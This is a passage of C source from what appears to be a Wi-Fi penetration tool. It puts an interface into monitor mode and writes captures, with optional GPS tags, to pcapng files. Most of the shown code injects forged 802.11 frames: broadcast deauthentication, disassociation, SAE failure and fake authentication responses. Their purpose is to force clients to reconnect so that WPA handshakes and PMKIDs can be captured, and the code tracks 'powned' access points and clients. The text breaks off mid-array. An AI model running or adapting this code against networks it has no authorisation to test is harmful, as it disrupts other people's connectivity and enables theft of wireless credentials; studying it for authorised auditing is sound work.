#define _GNU_SOURCE
#include <ctype.h>
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>

#ifdef __ANDROID__
#include <libgen.h>
#define strdupa strdup
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif

#include <net/if.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <linux/nl80211.h>

#include "netlink/netlink.h"
#include "netlink/genl/genl.h"
#include "netlink/genl/ctrl.h"

#include "include/version.h"
#include "include/wifidog.h"
#include "include/rpigpio.h"
#include "include/wireless-lite.h"
#include "include/pcap.h"
#include "include/ieee80211.h"
#include "include/hashops.h"
#include "include/strings.h"

/*===========================================================================*/
/* global var */

static int fd_socket;
static int fd_socket_gpsd;
static int fd_pcapng;
static int fd_ippcapng;
static int fd_weppcapng;
static int fd_rcascanpcapng;

static maclist_t *filterlist;
static int filterlist_len;

static struct ifreq ifr_old;
static struct iwreq iwr_old;

static aplist_t *aplist, *aplist_ptr;
static int aplistcount;

static myaplist_t *myaplist, *myaplist_ptr;
static macmaclist_t *pownedlist;

static enhanced_packet_block_t *epbhdr;

static uint8_t *packet_ptr;
static int packet_len;
static uint8_t *ieee82011_ptr;
static int ieee82011_len;
static mac_t *macfrx;

static uint8_t *payload_ptr;
static int payload_len;

static uint8_t *llc_ptr;
static llc_t *llc;

static uint8_t *mpdu_ptr;
static mpdu_t *mpdu;

static uint8_t statusout;

static int gpsd_len;

static int errorcount;
static int maxerrorcount;

static unsigned long long int incommingcount;
static unsigned long long int outgoingcount;
static unsigned long long int droppedcount;
static unsigned long long int pownedcount;

static int day;
static int month;
static int year;
static int hour;
static int minute;
static int second;

static long double lat;
static long double lon;
static long double alt;

static bool wantstopflag;
static bool ignorewarningflag;
static bool poweroffflag;
static bool staytimeflag;
static bool gpsdflag;
static bool activescanflag;
static bool rcascanflag;
static bool deauthenticationflag;
static bool disassociationflag;
static bool attackapflag;
static bool attackclientflag;

static int filtermode;
static int eapoltimeout;
static int deauthenticationintervall;
static int deauthenticationsmax;
static int apattacksintervall;
static int apattacksmax;
static int staytime;
static int stachipset;
static uint8_t cpa;

static int gpiostatusled;
static int gpiobutton;

static uint32_t myouiap;
static uint32_t mynicap;
static uint32_t myouista;
static uint32_t mynicsta;

static uint64_t timestamp;
static uint64_t timestampstart;

struct timeval tv;
static uint64_t mytime;

static int mydisassociationsequence;
static int myidrequestsequence;
static int mydeauthenticationsequence;
static int mybeaconsequence;
static int myproberequestsequence;
static int myauthenticationrequestsequence;
static int myauthenticationresponsesequence;
static int myassociationrequestsequence;
static int myassociationresponsesequence;
static int myproberesponsesequence;

static char *interfacename;
static char *pcapngoutname;
static char *ippcapngoutname;
static char *weppcapngoutname;
static char *filterlistname;
static char *filterssid;
static char *rcascanlistname;
static char *rcascanpcapngname;

static int filterchannel;

static const uint8_t hdradiotap[] = {
	0x00, 0x00,		// radiotap version + pad byte
	0x0e, 0x00,		// radiotap header length
	0x06, 0x8c, 0x00, 0x00,	// bitmap
	0x00,			// flags
	0x02,			// rate
	0x14,			// tx power
	0x01,			// antenna
	0x08, 0x00		// tx flags
#define HDRRT_SIZE sizeof(hdradiotap)
};

static uint8_t channeldefaultlist[] = {
	1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
	32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68,
	96,
	100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126,
	    128,
	132, 134, 136, 138, 140, 142, 144,
	149, 151, 153, 155, 157, 159, 161,
	161, 165, 169, 173,
	0
};

static uint8_t channelscanlist[128] = {
	1, 6, 2, 11, 1, 13, 6, 11, 1, 6, 3, 11, 1, 12, 6, 11,
	1, 6, 4, 11, 1, 10, 6, 11, 1, 6, 11, 5, 1, 6, 11, 8,
	1, 9, 6, 11, 1, 6, 11, 7, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

static uint8_t mac_orig[6];
static uint8_t mac_mysta[6];
static uint8_t mac_myap[6];
static uint8_t mac_mybcap[6];

static unsigned long long int rcrandom;
static uint8_t anoncerandom[32];

static uint64_t lasttimestampm1;
static uint8_t laststam1[6];
static uint8_t lastapm1[6];
static uint64_t lastrcm1;

static uint64_t lasttimestampm2;
static uint8_t laststam2[6];
static uint8_t lastapm2[6];
static uint64_t lastrcm2;

static uint8_t epb[PCAPNG_MAXSNAPLEN * 2];
static char gpsddata[GPSDDATA_MAX + 1];

/*===========================================================================*/
#ifdef DEBUG
static inline void debugprint(int len, uint8_t * ptr)
{
	static int p;

	fprintf(stdout, "\nRAW: ");

	for (p = 0; p < len; p++) {
		fprintf(stdout, "%02x", ptr[p]);
	}
	fprintf(stdout, "\n");
	return;
}
#endif
/*===========================================================================*/
static inline void checkunwanted(char *unwantedname)
{
	static FILE *fp;
	static char pidline[1024];
	static char *pidptr = NULL;

	memset(&pidline, 0, 1024);
	fp = popen(unwantedname, "r");
	if (fp) {
		pidptr = fgets(pidline, 1024, fp);
		if (pidptr != NULL) {
			fprintf(stderr, "warning: %s is running with pid %s",
				&unwantedname[6], pidline);
		}
		pclose(fp);
	}
	return;
}

/*===========================================================================*/
static inline bool checkmonitorinterface(char *checkinterfacename)
{
	static char *monstr = "mon";

	if (checkinterfacename == NULL) {
		return true;
	}
	if (strstr(checkinterfacename, monstr) == NULL) {
		return false;
	}
	return true;
}

/*===========================================================================*/
static inline void checkallunwanted()
{
	static char *networkmanager = "pidof NetworkManager";
	static char *wpasupplicant = "pidof wpa_supplicant";

	checkunwanted(networkmanager);
	checkunwanted(wpasupplicant);
	return;
}

/*===========================================================================*/
static inline void saveapinfo()
{
	static int c, p;
	static aplist_t *zeiger;
	static FILE *fhrsl;

	if ((fhrsl = fopen(rcascanlistname, "w+")) == NULL) {
		fprintf(stderr, "error opening file %s", rcascanlistname);
		return;
	}
	qsort(aplist, aplist_ptr - aplist, APLIST_SIZE, sort_aplist_by_essid);
	zeiger = aplist;
	for (c = 0; APLIST_MAX; c++) {
		if (zeiger->timestamp == 0) {
			break;
		}
		for (p = 0; p < 6; p++) {
			fprintf(fhrsl, "%02x", zeiger->addr[p]);
		}
		if (isasciistring(zeiger->essid_len, zeiger->essid) != false) {
			fprintf(fhrsl, " %.*s", zeiger->essid_len,
				zeiger->essid);
		} else {
			fprintf(stdout, " $HEX[");
			for (p = 0; p < zeiger->essid_len; p++) {
				fprintf(fhrsl, "%02x", zeiger->essid[p]);
			}
			fprintf(stdout, "]");
		}
		if (zeiger->status == 1) {
			fprintf(fhrsl, " [CHANNEL %d, AP IN RANGE]\n",
				zeiger->channel);
		} else {
			fprintf(fhrsl, " [CHANNEL %d]\n", zeiger->channel);
		}
		zeiger++;
	}
	fclose(fhrsl);
	return;
}

/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
	static struct ifreq ifr;
	static char *gpsd_disable = "?WATCH={\"enable\":false}";

	sync();

	if (gpiostatusled > 0) {
		GPIO_CLR = 1 << gpiostatusled;
		usleep(GPIO_DELAY);
		GPIO_SET = 1 << gpiostatusled;
		usleep(GPIO_DELAY);
		GPIO_CLR = 1 << gpiostatusled;
		usleep(GPIO_DELAY);
		GPIO_SET = 1 << gpiostatusled;
		usleep(GPIO_DELAY);
	}

	if (fd_socket > 0) {
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
		ioctl(fd_socket, SIOCSIFFLAGS, &ifr);
		if (ignorewarningflag == false) {
			ioctl(fd_socket, SIOCSIWMODE, &iwr_old);
		}
		ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old);
		if (close(fd_socket) != 0) {
			perror("failed to close raw socket");
		}
	}
	if (gpsdflag == true) {
		if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
			perror("failed to terminate GPSD WATCH");
		}
	}
	if (fd_socket_gpsd > 0) {
		if (close(fd_socket_gpsd) != 0) {
			perror("failed to close gpsd socket");
		}
	}
	if (fd_weppcapng > 0) {
		writeisb(fd_weppcapng, 0, timestampstart, incommingcount);
		if (fsync(fd_weppcapng) != 0) {
			perror("failed to sync wep pcapng file");
		}
		if (close(fd_weppcapng) != 0) {
			perror("failed to close wep pcapng file");
		}
	}
	if (fd_ippcapng > 0) {
		writeisb(fd_ippcapng, 0, timestampstart, incommingcount);
		if (fsync(fd_ippcapng) != 0) {
			perror("failed to sync ip pcapng file");
		}
		if (close(fd_ippcapng) != 0) {
			perror("failed to close ip pcapng file");
		}
	}
	if (fd_pcapng > 0) {
		writeisb(fd_pcapng, 0, timestampstart, incommingcount);
		if (fsync(fd_pcapng) != 0) {
			perror("failed to sync pcapng file");
		}
		if (close(fd_pcapng) != 0) {
			perror("failed to close pcapng file");
		}
	}

	if (filterlist != NULL) {
		free(filterlist);
	}

	if (aplist != NULL) {
		free(aplist);
	}

	if (myaplist != NULL) {
		free(myaplist);
	}

	if (pownedlist != NULL) {
		free(pownedlist);
	}

	if (rcascanflag == true) {
		if (fd_rcascanpcapng > 0) {
			writeisb(fd_rcascanpcapng, 0, timestampstart,
				 incommingcount);
			if (fsync(fd_rcascanpcapng) != 0) {
				perror("failed to sync pcapng file");
			}
			if (close(fd_rcascanpcapng) != 0) {
				perror("failed to close pcapng file");
			}
		}
		if (rcascanlistname != NULL) {
			saveapinfo();
		}
	}

	printf("\nterminated...\e[?25h\n");
	if (poweroffflag == true) {
		if (system("poweroff") != 0) {
			printf("can't power off\n");
		}
	}
	if (errorcount != 0) {
		exit(EXIT_FAILURE);
	}
	exit(EXIT_SUCCESS);
}

/*===========================================================================*/
static inline void printapinfo(uint8_t ch)
{
	static int c, p;
	static int rangecount;
	static aplist_t *zeiger;
	struct timeval tvfd;
	static char timestring[16];

	rangecount = 0;
	zeiger = aplist;
	qsort(aplist, aplistcount, APLIST_SIZE, sort_aplist_by_essid);
	printf("\e[1;1H\e[2J");
	for (c = 0; c < aplistcount; c++) {
		if (zeiger->timestamp == 0) {
			break;
		}
		tvfd.tv_sec = zeiger->timestamp / 1000000;
		tvfd.tv_usec = 0;
		strftime(timestring, 16, "%H:%M:%S", localtime(&tvfd.tv_sec));
		fprintf(stdout, "[%s] ", timestring);
		for (p = 0; p < 6; p++) {
			fprintf(stdout, "%02x", zeiger->addr[p]);
		}
		if ((zeiger->essid_len == 0) || (zeiger->essid[0] == 0)) {
			fprintf(stdout, " <hidden ssid>");
		} else {
			if (isasciistring(zeiger->essid_len, zeiger->essid) ==
			    true) {
				fprintf(stdout, " %.*s", zeiger->essid_len,
					zeiger->essid);
			} else {
				fprintf(stdout, " $HEX[");
				for (p = 0; p < zeiger->essid_len; p++) {
					fprintf(stdout, "%02x",
						zeiger->essid[p]);
				}
				fprintf(stdout, "]");
			}
		}
		if (zeiger->status == 1) {
			fprintf(stdout, " [CHANNEL %d, AP IN RANGE]\n",
				zeiger->channel);
			rangecount++;
		} else {
			fprintf(stdout, " [CHANNEL %d]\n", zeiger->channel);
		}
		zeiger++;
	}
	fprintf(stdout,
		"INFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, err=%d, aps=%d (%d in range)\n"
		"-----------------------------------------------------------------------------------\n",
		ch, incommingcount, droppedcount,
		outgoingcount, errorcount, aplistcount, rangecount);
	return;
}

/*===========================================================================*/
static inline void printtimenet(uint8_t * mac_to, uint8_t * mac_from)
{
	static int p;
	static char timestring[16];

	strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
	fprintf(stdout, "\33[2K\r[%s - %03d] ", timestring,
		channelscanlist[cpa]);
	for (p = 0; p < 6; p++) {
		fprintf(stdout, "%02x", mac_from[p]);
	}
	fprintf(stdout, " -> ");
	for (p = 0; p < 6; p++) {
		fprintf(stdout, "%02x", mac_to[p]);
	}
	return;
}

/*===========================================================================*/
static inline void printessid(int essidlen, uint8_t * essid)
{
	static int p;

	if (essidlen == 0) {
		fprintf(stdout, " <hidden ssid>");
		return;
	}
	if (isasciistring(essidlen, essid) != false) {
		fprintf(stdout, " %.*s", essidlen, essid);
	} else {
		fprintf(stdout, " $HEX[");
		for (p = 0; p < essidlen; p++) {
			fprintf(stdout, "%02x", essid[p]);
		}
		fprintf(stdout, "]");
	}
	return;
}

/*===========================================================================*/
static inline void printid(uint16_t idlen, uint8_t * id)
{
	static int p;

	if (id[0] == 0) {
		return;
	}
	if (isasciistring(idlen, id) != false) {
		fprintf(stdout, " %.*s", idlen, id);
	} else {
		fprintf(stdout, " $HEX[");
		for (p = 0; p < idlen; p++) {
			fprintf(stdout, "%02x", id[p]);
		}
		fprintf(stdout, "]");
	}
	return;
}

/*===========================================================================*/
static void writeepbm2(int fd)
{
	static int epblen;
	static int written;
	static uint16_t padding;
	static total_length_t *totallenght;
	static int gpsdlen;
	static char *gpsdptr;
	static char *gpsd_time = "\"time\":";
	static char *gpsd_lat = "\"lat\":";
	static char *gpsd_lon = "\"lon\":";
	static char *gpsd_alt = "\"alt\":";
	static char aplesscomment[] = { "HANDSHAKE AP-LESS" };
#define APLESSCOMMENT_SIZE sizeof(aplesscomment)

	static char gpsdatabuffer[GPSDDATA_MAX];

	epbhdr = (enhanced_packet_block_t *) epb;
	epblen = EPB_SIZE;
	epbhdr->block_type = EPBBID;
	epbhdr->interface_id = 0;
	epbhdr->cap_len = packet_len;
	epbhdr->org_len = packet_len;
	epbhdr->timestamp_high = timestamp >> 32;
	epbhdr->timestamp_low = (uint32_t) timestamp & 0xffffffff;
	padding = (4 - (epbhdr->cap_len % 4)) % 4;
	epblen += packet_len;
	memset(&epb[epblen], 0, padding);
	epblen += padding;
	if (gpsdflag == false) {
		epblen +=
		    addoption(epb + epblen, SHB_COMMENT, APLESSCOMMENT_SIZE,
			      aplesscomment);
	} else {
		if ((gpsdptr = strstr(gpsddata, gpsd_time)) != NULL) {
			sscanf(gpsdptr + 8, "%d-%d-%dT%d:%d:%d;", &year, &month,
			       &day, &hour, &minute, &second);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_lat)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lat);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_lon)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lon);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_alt)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &alt);
		}
		sprintf(gpsdatabuffer,
			"lat:%Lf,lon:%Lf,alt:%Lf,date:%02d.%02d.%04d,time:%02d:%02d:%02d\n%s",
			lat, lon, alt, day, month, year, hour, minute, second,
			aplesscomment);
		gpsdlen = strlen(gpsdatabuffer);
		epblen +=
		    addoption(epb + epblen, SHB_COMMENT, gpsdlen,
			      gpsdatabuffer);
	}
	epblen +=
	    addoption(epb + epblen, OPTIONCODE_ANONCE, 32,
		      (char *) anoncerandom);
	epblen += addoption(epb + epblen, SHB_EOC, 0, NULL);
	totallenght = (total_length_t *) (epb + epblen);
	epblen += TOTAL_SIZE;
	epbhdr->total_length = epblen;
	totallenght->total_length = epblen;

	written = write(fd, &epb, epblen);
	if (written != epblen) {
		errorcount++;
	}
	return;
}

/*===========================================================================*/
static void writeepb(int fd)
{
	static int epblen;
	static int written;
	static uint16_t padding;
	static total_length_t *totallenght;
	static int gpsdlen;
	static char *gpsdptr;
	static char *gpsd_time = "\"time\":";
	static char *gpsd_lat = "\"lat\":";
	static char *gpsd_lon = "\"lon\":";
	static char *gpsd_alt = "\"alt\":";

	static char gpsdatabuffer[GPSDDATA_MAX];

	epbhdr = (enhanced_packet_block_t *) epb;
	epblen = EPB_SIZE;
	epbhdr->block_type = EPBBID;
	epbhdr->interface_id = 0;
	epbhdr->cap_len = packet_len;
	epbhdr->org_len = packet_len;
	epbhdr->timestamp_high = timestamp >> 32;
	epbhdr->timestamp_low = (uint32_t) timestamp & 0xffffffff;
	padding = (4 - (epbhdr->cap_len % 4)) % 4;
	epblen += packet_len;
	memset(&epb[epblen], 0, padding);
	epblen += padding;
	if (gpsdflag == true) {
		if ((gpsdptr = strstr(gpsddata, gpsd_time)) != NULL) {
			sscanf(gpsdptr + 8, "%d-%d-%dT%d:%d:%d;", &year, &month,
			       &day, &hour, &minute, &second);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_lat)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lat);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_lon)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lon);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_alt)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &alt);
		}
		sprintf(gpsdatabuffer,
			"lat:%Lf,lon:%Lf,alt:%Lf,date:%02d.%02d.%04d,time:%02d:%02d:%02d",
			lat, lon, alt, day, month, year, hour, minute, second);
		gpsdlen = strlen(gpsdatabuffer);
		epblen +=
		    addoption(epb + epblen, SHB_COMMENT, gpsdlen,
			      gpsdatabuffer);
		epblen += addoption(epb + epblen, SHB_EOC, 0, NULL);
	}
	totallenght = (total_length_t *) (epb + epblen);
	epblen += TOTAL_SIZE;
	epbhdr->total_length = epblen;
	totallenght->total_length = epblen;

	written = write(fd, &epb, epblen);
	if (written != epblen) {
		errorcount++;
	}
	return;
}

/*===========================================================================*/
static inline uint8_t *gettag(uint8_t tag, uint8_t * tagptr, int restlen)
{
	static ietag_t *tagfield;

	while (0 < restlen) {
		tagfield = (ietag_t *) tagptr;
		if (tagfield->id == tag) {
			if (restlen >= (int) tagfield->len + (int) IETAG_SIZE) {
				return tagptr;
			} else {
				return NULL;
			}
		}
		tagptr += tagfield->len + IETAG_SIZE;
		restlen -= tagfield->len + IETAG_SIZE;
	}
	return NULL;
}

/*===========================================================================*/
static inline bool checkfilterlistentry(uint8_t * filtermac)
{
	static int c;
	static maclist_t *zeiger;

	zeiger = filterlist;
	for (c = 0; c < filterlist_len; c++) {
		if (memcmp(zeiger->addr, filtermac, 6) == 0) {
			return true;
		}
		zeiger++;
	}

	return false;
}

/*===========================================================================*/
static inline int checkpownedap(uint8_t * macap)
{
	static int c;
	static macmaclist_t *zeiger;

	zeiger = pownedlist;
	for (c = 0; c < POWNEDLIST_MAX; c++) {
		if (zeiger->timestamp == 0) {
			return 0;
		}
		if (memcmp(zeiger->addr2, macap, 6) == 0) {
			return zeiger->status;
		}
		zeiger++;
	}
	return 0;
}

/*===========================================================================*/
static inline int checkpownedstaap(uint8_t * pownedmacsta,
				   uint8_t * pownedmacap)
{
	static int c;
	static macmaclist_t *zeiger;

	zeiger = pownedlist;
	for (c = 0; c < POWNEDLIST_MAX; c++) {
		if (zeiger->timestamp == 0) {
			return 0;
		}
		if ((memcmp(zeiger->addr1, pownedmacsta, 6) == 0)
		    && (memcmp(zeiger->addr2, pownedmacap, 6) == 0)) {
			return zeiger->status;
		}
		zeiger++;
	}
	return 0;
}

/*===========================================================================*/
static inline int addpownedstaap(uint8_t * pownedmacsta, uint8_t * pownedmacap,
				 uint8_t status)
{
	static int c;
	static macmaclist_t *zeiger;

	zeiger = pownedlist;
	for (c = 0; c < POWNEDLIST_MAX - 1; c++) {
		if (zeiger->timestamp == 0) {
			break;
		}
		if ((memcmp(zeiger->addr1, pownedmacsta, 6) == 0)
		    && (memcmp(zeiger->addr2, pownedmacap, 6) == 0)) {
			if ((zeiger->status & status) == status) {
				return zeiger->status;
			}
			zeiger->status |= status;
			if (status > RX_M1) {
				pownedcount++;
			}
			return 0;
		}
		zeiger++;
	}
	zeiger->timestamp = timestamp;
	zeiger->status = status;
	memcpy(zeiger->addr1, pownedmacsta, 6);
	memcpy(zeiger->addr2, pownedmacap, 6);
	if (status > RX_M1) {
		pownedcount++;
	}
	qsort(pownedlist, c + 1, MACMACLIST_SIZE, sort_macmaclist_by_time);
	return 0;
}

/*===========================================================================*/
static void send_requestidentity(uint8_t * macsta, uint8_t * macap)
{
	static mac_t *macftx;
	static const uint8_t requestidentitydata[] = {
		0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
		0x01, 0x00, 0x00, 0x0a, 0x01, 0x63, 0x00, 0x0a, 0x01, 0x68,
		    0x65, 0x6c, 0x6c, 0x6f
	};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_QOS + REQUESTIDENTITY_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_DATA;
	macftx->subtype = IEEE80211_STYPE_QOS_DATA;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->from_ds = 1;
	macftx->duration = 0x002c;
	macftx->sequence = myidrequestsequence++ << 4;
	if (myidrequestsequence >= 4096) {
		myidrequestsequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_QOS], &requestidentitydata,
	       REQUESTIDENTITY_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_QOS + REQUESTIDENTITY_SIZE) < 0) {
		perror("\nfailed to transmit requestidentity");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static void send_disassociation(uint8_t * macsta, uint8_t * macap,
				uint8_t reason)
{
	static uint8_t retstatus;
	static mac_t *macftx;

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macap) == false)) {
		return;
	}
	retstatus = checkpownedstaap(macsta, macap);
	if ((retstatus & RX_PMKID) == RX_PMKID) {
		return;
	}
	if ((retstatus & RX_M23) == RX_M23) {
		return;
	}

	memset(&packetout, 0, HDRRT_SIZE + MAC_SIZE_NORM + 2 + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_DISASSOC;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = mydisassociationsequence++ << 4;
	if (mydisassociationsequence >= 4096) {
		mydisassociationsequence = 0;
	}
	packetout[HDRRT_SIZE + MAC_SIZE_NORM] = reason;
	if (write(fd_socket, packetout, HDRRT_SIZE + MAC_SIZE_NORM + 2) < 0) {
		perror("\nfailed to transmit deuthentication");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static void send_saefailure(uint8_t * macsta, uint8_t * macap,
			    uint16_t saesequence)
{
	static uint8_t retstatus;
	static mac_t *macftx;

	static const uint8_t saeerrordata[] = {
		0x03, 0x00, 0x02, 0x00, 0x01, 0x00
	};
#define SEAERROR_SIZE sizeof(saeerrordata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macap) == false)) {
		return;
	}
	retstatus = checkpownedstaap(macsta, macap);
	if ((retstatus & RX_PMKID) == RX_PMKID) {
		return;
	}
	if ((retstatus & RX_M23) == RX_M23) {
		return;
	}

	memset(&packetout, 0, HDRRT_SIZE + MAC_SIZE_NORM + 2 + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_AUTH;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	saesequence++;
	if (saesequence >= 4096) {
		saesequence = 0;
	}
	macftx->sequence = saesequence << 4;
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM], &saeerrordata,
	       SEAERROR_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + SEAERROR_SIZE) < 0) {
		perror("\nfailed to transmit deuthentication");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static void send_broadcast_deauthentication(uint8_t * macap, uint8_t reason)
{
	static uint8_t retstatus;
	static mac_t *macftx;

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macap) == false)) {
		return;
	}
	retstatus = checkpownedap(macap);
	if ((retstatus & RX_PMKID) == RX_PMKID) {
		return;
	}
	if ((retstatus & RX_M23) == RX_M23) {
		return;
	}

	memset(&packetout, 0, HDRRT_SIZE + MAC_SIZE_NORM + 2 + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_DEAUTH;
	memcpy(macftx->addr1, &mac_broadcast, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = mydeauthenticationsequence++ << 4;
	if (mydeauthenticationsequence >= 4096) {
		mydeauthenticationsequence = 0;
	}
	packetout[HDRRT_SIZE + MAC_SIZE_NORM] = reason;
	if (write(fd_socket, packetout, HDRRT_SIZE + MAC_SIZE_NORM + 2) < 0) {
		perror("\nfailed to transmit deauthentication to broadcast");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline void send_authenticationresponseopensystem(uint8_t * macsta,
							 uint8_t * macap)
{
	static mac_t *macftx;

	static const uint8_t authenticationresponsedata[] = {
		0x00, 0x00, 0x02, 0x00, 0x00, 0x00
	};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}
	if (checkpownedstaap(macsta, macap) > RX_PMKID) {
		return;
	}

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + AUTHENTICATIONRESPONSE_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_AUTH;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = myauthenticationrequestsequence++ << 4;
	if (myauthenticationrequestsequence >= 4096) {
		myauthenticationrequestsequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM],
	       &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + AUTHENTICATIONRESPONSE_SIZE) < 0) {
		perror("\nfailed to transmit authenticationresponse");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline void send_authenticationrequestopensystem(uint8_t * mac_ap)
{
	static int cssize;
	static mac_t *macftx;

	static const uint8_t authenticationrequestdata[] = {
		0x00, 0x00, 0x01, 0x00, 0x00, 0x00
	};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

	static const uint8_t csbroadcom[] = {
		0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x02, 0xf0, 0x05, 0x00, 0x00
	};
#define CSBROADCOM_SIZE sizeof(csbroadcom)

	static const uint8_t csapplebroadcom[] = {
		0xdd, 0x0b, 0x00, 0x17, 0xf2, 0x0a, 0x00, 0x01, 0x04, 0x00,
		    0x00, 0x00, 0x00,
		0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00
	};
#define CSAPPLEBROADCOM_SIZE sizeof(csapplebroadcom)

	static const uint8_t cssonos[] = {
		0xdd, 0x06, 0x00, 0x0e, 0x58, 0x02, 0x01, 0x01
	};
#define CSSONOS_SIZE sizeof(cssonos)

	static const uint8_t csnetgearbroadcom[] = {
